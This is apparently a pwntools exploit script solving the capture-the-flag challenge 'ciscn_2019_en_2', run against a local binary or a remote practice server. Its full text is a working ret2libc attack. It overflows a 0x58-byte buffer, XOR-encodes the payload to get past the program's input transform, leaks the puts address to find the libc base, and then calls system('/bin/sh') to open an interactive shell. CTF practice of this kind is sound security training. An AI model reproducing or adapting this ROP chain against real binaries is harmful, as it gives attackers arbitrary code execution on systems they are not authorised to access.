import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	if len(sys.argv)==1 :
		io=process('./ciscn_2019_en_2')
		elf=ELF('./ciscn_2019_en_2')
		libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
	else :
		io=remote('node3.buuoj.cn',28473)
		elf=ELF('./ciscn_2019_en_2')
		libc=ELF('./libc.so')



	def encode(a):
		s=''
		for i in a :
			if ord(i)<= 0x60 or ord(i)> 0x7A :
				if ord(i)<= 0x40 or ord(i)> 0x5A :
					if ord(i) > 0x2F and ord(i) <= 0x39 :
						i=chr(ord(i)^0xC)
				else:
					i=chr(ord(i)^0xd)
			else:
				i=chr(ord(i)^0xe)
			s+=i
		return s


	io.recv()
	io.sendline('1')
	pop_rdi=0x0000000000400c83
	pay='a'*0x58+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x400790)
	pay=encode(pay)
	io.recv()
	io.sendline(pay)
	io.recv(0x67)
	libc.address=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
	success('libc:'+hex(libc.address))
	pay='a'*0x58+p64(pop_rdi)+p64(libc.search('/bin/sh\x00').next())+p64(libc.sym['system'])+p64(0x4009a0)
	io.recv()
	io.sendline('1')
	io.recv()
	#pay=encode(pay)
	io.sendline(pay)

	#gdb.attach(io)
	#pause()
	io.interactive()